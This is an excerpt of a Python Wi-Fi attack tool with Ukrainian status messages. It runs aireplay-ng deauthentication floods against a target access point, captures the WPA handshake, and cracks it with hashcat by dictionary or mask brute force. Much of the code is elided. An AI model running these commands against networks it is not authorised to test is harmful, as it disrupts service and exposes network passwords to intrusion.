...
def handshake_capture(api, network, method='deauth', packets_per_sec=10, duration=70):
    ...
    remote_hccapx_file = f"{remote_hccapx_folder}/{file_name}.hc22000"
    ...
    try:
        ...
        if method == 'deauth' or method == 'both':
            aireplay_command = f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon "
        ...
        api.dispatch_event('message', {'message': '[Handshake]: Конвертуємо CAP у HC22000...', 'type': 'info'})
        ...
        if stdout.read().strip():
            ...
            api.dispatch_event('message', {'message': f'[Handshake]: HC22000-файл знайдено!', 'type': 'success'})
            ...
            local_file = os.path.join(local_handshake_path, f"{file_name}.hc22000")
            result = {
                'success': True,
                'captured': True,
                'file': f"{file_name}.hc22000",
                'message': 'Handshake успішно перехоплено'
            }
        else:
            print("Файл HС22000 не створено.")
            api.dispatch_event('message', {'message': '[Handshake]: Файл HC22000 не створено. Спробуйте ще раз.', 'type': 'warning'})
            result = {
                'success': True,
                'captured': False,
                'file': None,
...
def handshake_decrypt_dictionary(api, handshake_file, dict_file):
    ...
    # Get path to utils folder (parent of lib folder)
    utils_path = os.path.join(local_path, "..", "utils")
    hashcat_exe = os.path.join(utils_path, "hashcat.exe")
    ...
    command = f'"{hashcat_exe}" -m 22000 -a 0 "{handshake_path}" "{dict_path}"'
    print(f"\nЗапуск команди:\n{command}")
    ...
    try:
        # Run hashcat from utils folder
        process = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=utils_path)
...
def handshake_decrypt_bruteforce(api, handshake_file, password_length=8, use_lowercase=False,
    ...
    # Build hashcat command
    command = f'"{hashcat_exe}" -m 22000 -a 3 "{handshake_path}" {mask}'
    print(f"\nЗапуск команди:\n{command}")
